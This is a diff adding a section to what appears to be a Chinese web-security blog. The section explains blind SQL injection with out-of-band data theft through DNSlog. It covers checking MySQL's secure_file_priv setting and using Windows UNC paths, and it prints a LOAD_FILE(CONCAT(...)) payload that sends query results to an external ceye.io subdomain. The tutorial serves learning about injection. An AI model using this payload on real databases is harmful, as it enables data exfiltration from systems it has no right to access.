@@ -866,6 +866,22 @@
 <p>  以此类推。。。。。</p>
 <p>  如若使用的进程数超出我提出的大小，会导致进程竞争进而出现乱序输出的情况。</p>
 <p>但是单纯的多进程不会出现这个问题，初步判断是二分法大幅度的降低了对资源的调用，提高了写入临界区的频率，进而导致进程竞争，出现输出乱序，而我用的又是队列实现，需要对queue队列的锁原语<code>__init__</code> 才能解决（<del>一个猜测</del>），留个坑，以后填。</p>
+<h1 id="无回显SQL注入"><a href="#无回显SQL注入" class="headerlink" title="无回显SQL注入"></a>无回显SQL注入</h1><p>通过DNSlog盲注需要用的load_file()函数，所以一般得是root权限。先</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>查看load_file()可以读取的磁盘。</p>
+<ul>
+<li>当<code>secure_file_priv</code>为空，就可以读取磁盘的目录。</li>
+<li>当<code>secure_file_priv</code>为G:\，就可以读取G盘的文件。</li>
+<li>当<code>secure_file_priv</code>为null，load_file就不能加载文件。</li>
+</ul>
+<h2 id="UNC路径"><a href="#UNC路径" class="headerlink" title="UNC路径"></a>UNC路径</h2><p>但是当MySQL处于Linux系统中的时候，是不能使用这种方式外带数据。</p>
+<p>UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器。<br>UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。</p>
+<p>这也就解释了为什么concat()函数拼接了4个\了，因为转义的原因，4个就变\成了2个\，目的就是利用UNC路径。</p>
+<p>因为Linux没有UNC路径这个东西，所以当MySQL处于Linux系统中的时候，是不能使用这种方式外带数据</p>
+<p>由此Paylaod就为</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(CONCAT(<span class="string">&#x27;\\\\&#x27;</span>,(查询语句),<span class="string">&#x27;.t6n089.ceye.io\\abc&#x27;</span>));</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>Web安全</category>
